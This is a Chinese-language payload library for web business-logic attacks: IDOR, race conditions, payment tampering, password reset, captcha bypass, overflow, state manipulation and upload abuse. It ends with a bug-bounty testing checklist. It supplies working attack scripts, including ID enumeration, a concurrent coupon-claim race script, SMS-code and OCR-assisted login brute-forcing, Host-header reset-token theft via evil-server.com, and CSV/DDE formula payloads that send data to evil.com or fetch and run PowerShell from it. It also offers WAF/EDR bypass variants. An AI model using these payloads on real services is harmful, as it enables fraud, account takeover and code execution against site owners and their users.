# 业务逻辑漏洞 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:IDOR 越权访问 / 竞态条件(优惠券双花 / 余额超扣) / 支付逻辑篡改 / 密码重置逻辑缺陷 / 验证码绕过。

---


### IDOR越权访问  `biz-idor`
不安全的直接对象引用(IDOR)，通过篡改请求参数中的对象ID越权访问他人数据。攻击者可遍历用户ID、订单号等参数获取未授权资源。
子类：**越权漏洞** · tags: `IDOR` `越权` `业务逻辑` `OWASP` `A01`

**前置条件：** 目标存在基于ID的资源访问接口；已登录普通用户账号

**攻击链：**

**1. 1. 识别可遍历参数**
_识别API中使用数字/UUID作为资源标识符的端点_
```
# 抓取请求中的ID参数
GET /api/users/1001/profile HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 常见IDOR参数：user_id, order_id, file_id, invoice_id, account_id
```

**2. 2. 水平越权测试**
_遍历用户ID参数，观察响应码和大小差异以确认越权_
```
# 用A用户的Token访问B用户的数据
for id in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    -H "Authorization: Bearer {TOKEN}" \
    "https://{TARGET}/api/users/$id/profile"
  echo " -> user_id=$id"
done
```

**3. 3. 垂直越权测试**
_尝试以低权限用户调用管理员API或修改自身角色_
```
# 用普通用户Token访问管理员接口
GET /api/admin/users HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 尝试修改角色
PUT /api/users/1001 HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}
Content-Type: application/json

{"role": "admin", "is_admin": true}
```

**4. 4. 参数污染越权**
_利用参数重复、JSON键覆盖和数组注入绕过IDOR防御_
```
# 双参数污染
GET /api/orders?user_id=1001&user_id=1002 HTTP/1.1

# JSON参数覆盖
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{"user_id": 1001, "name": "test", "user_id": 1002}

# 数组注入
GET /api/orders?user_id[]=1001&user_id[]=1002 HTTP/1.1
```

**WAF/EDR 绕过变体：**

**1. 编码ID绕过**
_通过编码、负数、溢出等方式绕过ID校验_
```
# Base64编码ID
/api/users/MTAwMQ== (base64 of 1001)
# Hex编码
/api/users/0x3E9
# 负数/溢出
/api/users/-1
/api/users/2147483647
```

---

### 竞态条件攻击  `biz-race-condition`
利用服务端TOCTOU(Time-of-Check to Time-of-Use)漏洞，通过并发请求在检查与执行之间的时间窗口内多次触发同一操作，实现重复领券、重复提现、超额购买等业务逻辑突破。
子类：**竞态条件** · tags: `竞态条件` `Race Condition` `TOCTOU` `并发` `业务逻辑`

**前置条件：** 目标存在余额/积分/优惠券等可量化资源操作；Python/Turbo Intruder环境

**攻击链：**

**1. 1. 识别竞态目标**
_识别涉及资源扣减、限量操作的API端点_
```
# 典型竞态场景：
# 1. 优惠券领取 POST /api/coupon/claim
# 2. 余额提现 POST /api/withdraw
# 3. 积分兑换 POST /api/points/exchange
# 4. 限量商品抢购 POST /api/order/create
# 5. 投票/点赞 POST /api/vote
```

**2. 2. Python并发测试脚本**
_使用Python asyncio并发发送50个相同请求，检测是否能多次领取_
```
import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)
        print(f"Total: {len(results)}, Success: {success}")

asyncio.run(main())
```

**3. 3. Burp Turbo Intruder测试**
_Burp Turbo Intruder的gate机制确保所有请求同时发出_
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    for i in range(50):
        engine.queue(target.req, gate="race1")
    engine.openGate("race1")

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)
```

**4. 4. 验证竞态成功**
_查询账户资源确认竞态条件是否成功利用_
```
# 检查资源是否被多次消耗
GET /api/user/coupons HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 预期：限领1张优惠券实际领到多张
# 检查余额变化
GET /api/user/balance HTTP/1.1
```

**WAF/EDR 绕过变体：**

**1. HTTP/2单连接并发**
_HTTP/2多路复用在单TCP连接中发送多个并发请求，绕过基于连接数的限制_
```
# HTTP/2 multiplexing同一连接并发
curl --http2 --parallel --parallel-max 50 \
  -H "Authorization: Bearer {TOKEN}" \
  -X POST "https://{TARGET}/api/coupon/claim" \
  -d '{"coupon_id":"C001"}' \
  --next --http2 --parallel ...
```

---

### 支付逻辑篡改  `biz-payment-tamper`
通过修改支付请求中的金额、数量、折扣等参数来操纵交易逻辑。常见于电商平台和在线支付系统中，可导致0元购、负价格、折扣叠加等严重业务风险。
子类：**支付安全** · tags: `支付` `金额篡改` `业务逻辑` `0元购` `电商安全`

**前置条件：** 目标存在支付/下单功能；可拦截和修改HTTP请求

**攻击链：**

**1. 1. 金额篡改测试**
_修改订单请求中的价格字段，测试后端是否校验金额_
```
POST /api/order/create HTTP/1.1
Host: {TARGET}
Content-Type: application/json
Authorization: Bearer {TOKEN}

# 原始请求
{"product_id": "P001", "quantity": 1, "price": 9900}

# 篡改为1分钱
{"product_id": "P001", "quantity": 1, "price": 1}

# 篡改为0元
{"product_id": "P001", "quantity": 1, "price": 0}

# 负数金额（退款到账）
{"product_id": "P001", "quantity": 1, "price": -100}
```

**2. 2. 数量与运费篡改**
_测试数量边界值、运费篡改和折扣溢出_
```
# 数量为0或负数
{"product_id": "P001", "quantity": 0, "price": 9900}
{"product_id": "P001", "quantity": -1, "price": 9900}

# 修改运费
{"product_id": "P001", "quantity": 1, "shipping_fee": -500}

# 超大折扣
{"product_id": "P001", "quantity": 1, "discount": 9999}
```

**3. 3. 优惠券叠加与替换**
_测试优惠券是否可叠加使用或替换为高面额券_
```
# 叠加使用多张优惠券
{"product_id": "P001", "coupons": ["C001", "C002", "C003"]}

# 替换高额优惠券ID
{"product_id": "P001", "coupon_id": "INTERNAL_VIP_100OFF"}

# 修改优惠金额字段
{"product_id": "P001", "coupon_discount": 9900}
```

**4. 4. 支付回调篡改**
_伪造支付平台回调通知，篡改支付状态和金额_
```
# 模拟支付成功回调
POST /api/payment/callback HTTP/1.1
Host: {TARGET}
Content-Type: application/x-www-form-urlencoded

order_id=ORD20240001&status=SUCCESS&amount=1&sign=tampered_sign

# 修改回调中的金额
order_id=ORD20240001&status=SUCCESS&amount=1&trade_no=FAKE123456
```

**WAF/EDR 绕过变体：**

**1. 科学计数法绕过**
_利用科学计数法、浮点精度、类型混淆绕过金额校验_
```
# 科学计数法
{"price": 1e-10}
# 浮点精度
{"price": 0.000000001}
# 字符串类型混淆
{"price": "0.01"}
# Unicode数字
{"price": "\uff10"}
```

---

### 密码重置逻辑缺陷  `biz-password-reset`
密码重置流程中的逻辑漏洞，包括重置令牌泄露、验证码爆破、响应操纵、Host头注入等攻击手法，可实现任意用户密码重置。
子类：**认证缺陷** · tags: `密码重置` `认证绕过` `业务逻辑` `验证码` `Host注入`

**前置条件：** 目标存在密码重置/找回功能；可拦截HTTP请求

**攻击链：**

**1. 1. Host头注入窃取重置链接**
_修改Host头使重置邮件中的链接指向攻击者服务器，窃取重置token_
```
POST /api/password/reset HTTP/1.1
Host: evil-server.com
X-Forwarded-Host: evil-server.com
Content-Type: application/json

{"email": "victim@target.com"}

# 受害者收到的重置链接变为：
# https://evil-server.com/reset?token=abc123
```

**2. 2. 验证码爆破**
_暴力破解4-6位验证码，测试是否有频率限制_
```
# 4位验证码爆破
for code in $(seq -w 0000 9999); do
  response=$(curl -s -X POST "https://{TARGET}/api/verify-code" \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"13800138000\",\"code\":\"$code\"}")
  if echo "$response" | grep -q "success"; then
    echo "[+] Code found: $code"
    break
  fi
done
```

**3. 3. 响应操纵绕过**
_拦截并修改服务端响应，前端可能仅依赖响应状态判断_
```
# 原始失败响应
{"code": 400, "message": "验证码错误"}

# 拦截并修改为成功
{"code": 200, "message": "验证成功", "token": "reset_token_here"}

# 某些前端仅检查code字段就放行后续操作
```

**4. 4. 重置令牌弱随机性**
_分析重置令牌的生成算法，检查是否基于可预测因素_
```
# 收集多个重置令牌分析规律
token1: 1707811200_user1  (时间戳+用户名)
token2: 1707811260_user2

# 可预测的token生成
import hashlib
token = hashlib.md5(f"{timestamp}_{email}".encode()).hexdigest()

# 使用已知信息构造重置token
predicted = hashlib.md5(b"1707811200_victim@target.com").hexdigest()
```

**WAF/EDR 绕过变体：**

**1. 多Host头绕过**
_使用多种HTTP头注入方式尝试覆盖重置链接中的域名_
```
# 双Host头
Host: target.com
Host: evil.com

# 绝对URL覆盖
POST https://evil.com/api/password/reset HTTP/1.1
Host: target.com

# X-Forwarded系列
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-URL: https://evil.com/reset
```

---

### 验证码绕过技术  `biz-captcha-bypass`
绕过图形验证码、短信验证码、滑动验证等人机验证机制的各种技术手法，包括响应泄露、复用攻击、OCR识别、逻辑缺陷利用等。
子类：**验证码安全** · tags: `验证码` `CAPTCHA` `绕过` `短信验证码` `人机验证`

**前置条件：** 目标存在验证码保护的功能；Python环境

**攻击链：**

**1. 1. 验证码响应泄露**
_检查响应body、header、cookie中是否泄露验证码明文或编码值_
```
# 检查响应中是否包含验证码
POST /api/send-sms HTTP/1.1
Host: {TARGET}
Content-Type: application/json

{"phone": "13800138000"}

# 响应可能泄露
{"code": 200, "captcha": "8462", "message": "发送成功"}
# 或在响应头中
X-Captcha-Code: 8462
Set-Cookie: captcha=ODQ2Mg==  (base64 of 8462)
```

**2. 2. 验证码复用攻击**
_验证码使用后未失效，同一验证码可反复使用_
```
# 步骤1: 正常获取并输入正确验证码
POST /api/login
{"username": "test", "password": "test123", "captcha": "8462", "captcha_id": "abc"}

# 步骤2: 使用相同captcha_id和验证码反复尝试
POST /api/login
{"username": "admin", "password": "admin123", "captcha": "8462", "captcha_id": "abc"}

# 如果验证码未在使用后失效，可以一直复用
```

**3. 3. 删除验证码参数**
_测试不传、空传、null传验证码参数时后端是否仍然校验_
```
# 原始请求（包含验证码）
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass", "captcha": "1234"}

# 删除验证码字段
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass"}

# 空值测试
{"username": "admin", "password": "pass", "captcha": ""}
{"username": "admin", "password": "pass", "captcha": null}
```

**4. 4. 万能验证码**
_测试开发者遗留的万能验证码或调试后门_
```
# 常见万能/调试验证码
0000
1111
1234
8888
9999
6666
000000
123456

# 测试接口调试后门
{"phone": "13800138000", "code": "000000", "debug": true}
{"phone": "13800138000", "code": "master_code"}
```

**WAF/EDR 绕过变体：**

**1. OCR自动识别图形验证码**
_使用ddddocr库自动识别图形验证码集成到爆破流程_
```
import ddddocr
import requests

ocr = ddddocr.DdddOcr()

def solve_captcha(target):
    # 获取验证码图片
    resp = requests.get(f"https://{target}/captcha/image")
    code = ocr.classification(resp.content)
    return code

# 集成到爆破脚本中
for pwd in passwords:
    captcha = solve_captcha("{TARGET}")
    r = requests.post(f"https://{TARGET}/api/login",
        json={"user":"admin","pass":pwd,"captcha":captcha})
    if "success" in r.text:
        print(f"[+] Password: {pwd}")
```

---


---

### 整数溢出与精度攻击  `biz-integer-overflow`
利用整数溢出、浮点精度丢失和舍入逻辑缺陷，实现负价格、零金额支付、超额取款等攻击。
子类：**业务逻辑** · tags: `整数溢出` `浮点精度` `舍入攻击` `金融安全`

**前置条件：** 目标存在金额/数量/积分等数值型输入

**攻击链：**

**1. 整数溢出**
_利用32位有符号整数最大值溢出为负数_
```
# INT_MAX + 1 → 负数
# 32-bit signed: 2147483647 → 2147483648 溢出为 -2147483648
POST /api/order/create HTTP/1.1
Host: {TARGET}
Content-Type: application/json

{"product_id": "P001", "quantity": 2147483648, "price": 1}
# 如果后端用 int32: quantity * price = -2147483648

# 超大数据类型溢出
{"product_id": "P001", "quantity": 1, "price": 9999999999999}
# 超过浮点精度 → rounds to 0
```

**2. 浮点精度绕过**
_利用浮点舍入和精度丢失_
```
# 极小金额：$0.001 舍入为 $0.00
POST /api/order/create
{"items": [{"id": "P001", "price": 0.001, "quantity": 1}]}
→ 1000 件商品 × $0.001 = $1.00 但单件舍入为 $0.00

# 科学计数法
{"price": 1e-10}  # 0.0000000001 → 可能被解析为 0

# 负数运费
{"product_id": "P001", "price": 100, "shipping_fee": -100}
→ 总价 = $100 + (-$100) = $0

# 币种汇率滞后套利
# 1. 用币种A按汇率X充值
# 2. 等待汇率变化
# 3. 用币种A按新汇率提现 → 套利差价
```

**3. 折扣叠加溢出**
_多优惠券/折扣叠加导致负数金额_
```
# 叠加测试
{"product_id": "P001", "coupons": ["SAVE50", "SAVE30", "SAVE20"]}
→ 50% + 30% + 20% = 100% off

# 固定金额券 + 可变价商品
# $5 off 券 + $3 商品 = -$2（余额到账）
```

**WAF/EDR 绕过变体：**

**1. 类型混淆绕过**
_通过类型切换绕过数值校验_
```
# 数字→字符串→数组
{"price": "0"}     # 字符串0
{"price": [0]}     # 数组0（取第一个=0）
{"price": null}    # null可能被当作0
{"price": -0}      # 负零
```

---

### 订阅/层级混淆  `biz-subscription-confusion`
利用订阅等级/试用期/功能权限在降级/过期后未正确回收的漏洞。
子类：**业务逻辑** · tags: `订阅` `试用` `权限回收` `层级提升`

**前置条件：** 目标存在分层订阅（免费/付费/企业）或试用机制

**攻击链：**

**1. 降级后权限残留**
_付费试用→降级到免费，功能是否禁用？_
```
# 1. 注册付费试用（7天免费试用Pro版）
# 2. 启用Pro专属功能X
# 3. 立即取消/降级到Free
# 4. 功能X是否仍然可用？
GET /api/pro-feature/advanced-export HTTP/1.1
Authorization: Bearer {FREE_ACCOUNT_TOKEN}
# 如果返回200 → 降级后权限未回收

# 5. API层检查 vs UI层检查
# UI隐藏了Pro按钮，但直接调API仍然成功
```

**2. 直接调用付费端点**
_UI隐藏 ≠ API有权限校验_
```
# 从JS bundle提取所有API端点
grep -r "pro\|premium\|enterprise\|admin" main.*.js

# 用免费账户Token直接调用
curl -H "Authorization: Bearer {FREE_TOKEN}" \
  "https://{TARGET}/api/pro/export" \
  -d '{"format":"excel"}'
# 检查服务端是否校验订阅状态
```

**3. 试用期无限延长**
_修改请求绕过试用到期检查_
```
# 注册时修改trial_days
POST /api/register HTTP/1.1
{"email":"test@test.com","password":"pass","trial_days":36500}

# 修改账户创建时间为过去500年
PUT /api/user/profile HTTP/1.1
{"created_at":"1970-01-01T00:00:00Z"}
```

---

### 对象状态操纵与事务复用  `biz-state-manipulation`
利用API接受客户端提交的状态字段，自触发退款/发货/审批等操作。
子类：**业务逻辑** · tags: `状态操纵` `事务复用` `审批绕过` `限额绕过`

**前置条件：** API接受状态字段输入；后端信任客户端提交的状态值

**攻击链：**

**1. 订单状态篡改**
_修改订单状态实现自触发操作_
```
# 正常订单状态机: pending → paid → shipped → delivered
# 攻击: 直接修改 status 字段
PUT /api/orders/ORD12345 HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}
Content-Type: application/json

{"status": "refunded"}    # 自触发退款
{"status": "shipped"}     # 标记为已发货（跳过支付）
{"status": "delivered"}   # 标记为已签收（后续争议利用）
```

**2. 事务ID复用**
_已使用的事务ID可被重复利用_
```
# 1. 正常发起支付 → 获得 transaction_id: TX_A
# 2. 完成购买（TX_A 已被消费）
# 3. 重新使用 TX_A 发起新订单
POST /api/checkout HTTP/1.1
{"transaction_id": "TX_A", "cart_id": "new_cart"}
# 如果后端不校验 TX 是否已使用 → 一笔支付两笔订单
```

**3. 限额计数器绕过**
_每日限额通过不同路径叠加或取消操作绕过_
```
# 场景: 每日转账限额 $1000
# 绕过1: 转账 $999 → 取消 → 转账 $999（取消未恢复限额计数器）
# 绕过2: 并行发送 N 笔 $999 转账（竞态条件绕过检查）
# 绕过3: 不同支付方式 / 货币不共享限额计数器
#   - 银行转账: $1000 ✅
#   - 钱包转账: $1000 ✅
#   - 信用卡: $1000 ✅
#   → 三种方式各转 $1000 = $3000 绕过
```

**4. 审批流程跳过**
_多步审批可跳步或并行提交_
```
# 正常流程: 员工提交 → 经理审批 → 财务审批 → 执行
# 攻击1: 直接调最后一步 API
POST /api/approval/execute HTTP/1.1
{"request_id": "REQ_001"}
# 攻击2: 并行提交到所有步骤（竞态）

# 攻击3: 修改自身的审批角色
PUT /api/user/profile HTTP/1.1
{"role": "approver", "approval_level": "finance"}
```

---

### 文件上传业务逻辑  `biz-upload-logic`
业务层面的上传功能滥用，非技术层面的文件类型绕过。
子类：**业务逻辑** · tags: `文件上传` `Zip炸弹` `CSV注入` `存储路径`

**攻击链：**

**1. Zip炸弹（资源耗尽）**
_上传高压缩比文件导致服务器DoS_
```
# 1KB zip → 解压后 1GB
# 生成: 逐层嵌套 0-filled 文件
# 上传到支持自动解压的功能（批量导入/头像包/素材包）
POST /api/upload/batch HTTP/1.1
Content-Type: multipart/form-data

# 上传 zip_bomb.zip (1KB → 4.5PB after 6 layers)
```

**2. CSV/Excel公式注入**
_数据导入功能中的公式注入_
```
# CSV 导入联系人/订单/用户
POST /api/import/csv HTTP/1.1
Content-Type: multipart/form-data

# CSV内容（上传后管理员下载查看触发）
Name,Email,Phone
=SYSTEM("calc"),test@test.com,13800138000
=cmd|'/c calc'!A1,test2@test.com,13800138001
=IMPORTXML("http://evil.com/log?data="&A1,),test3@test.com,13800138002

# Excel: DDE 注入
=cmd|'/c powershell -c IEX(iwr http://evil.com/p)'!_xlbgnm.A1
```

**3. 存储路径预测与覆盖**
_可预测的上传路径导致覆盖他人文件_
```
# 路径模式: /uploads/{USER_ID}/{filename}
# 攻击: 猜测其他 User ID 的文件名
GET /uploads/1001/avatar.png   # 正常获取自己
GET /uploads/1002/avatar.png   # 尝试读取他人

# 覆盖: 上传时指定路径
POST /api/upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="../../../uploads/1002/avatar.png"
```

---

### 业务逻辑测试execution-framework  `biz-methodology`

**9 步测试流程（按优先级）**

```
对每个业务流程:
1. 画出正常流程（Happy Path）
2. 问: "跳过第 N 步行不行？"（Skip step）
3. 问: "发负数/零/MAX 值会怎样？"（Boundary）
4. 问: "重复执行同一步两次？"（Idempotency）
5. 问: "先做 B 再做 A（颠倒顺序）？"（Order）
6. 问: "两个用户同时操作？"（Concurrency）
7. 问: "能不能修改'信任'的状态字段？"（Trust boundary）
8. 从金融/资源影响角度思考 → 最高赏金方向
9. 验证每一步的 API 端点是否有服务端校验（不只是 UI 隐藏/禁用）
```

**高影响检查清单**

_E-commerce / 支付_
```
□ 购物车数量负数
□ 多张冲突优惠券叠加
□ 竞态：礼品卡双花
□ 跳过支付步骤直接确认订单
□ 退款不退货（修改状态触发退款）
□ 币种舍入利用
□ 运费负数
□ 支付回调签名绕过
```

_认证 / 账户_
```
□ 2FA 绕过：密码步骤后直接访问/dashboard
□ 密码重置Token用后不失效
□ 邮箱验证绕过（验证后改邮箱不复验）
□ OAuth 账户接管（邮箱匹配逻辑缺陷）
□ 注册已有未验证邮箱
□ 修改他人密码（IDOR on reset endpoint）
```

_订阅 / 限额_
```
□ 降级后仍可访问付费功能
□ 并行请求超出速率/用量限制
□ 推荐循环刷无限积分
□ 免费试用 ≠ 时间限制（试用到期后无强制）
□ 直接 API 调用付费端点（无订阅状态校验）
□ 不同渠道不共享限额计数器
```

---
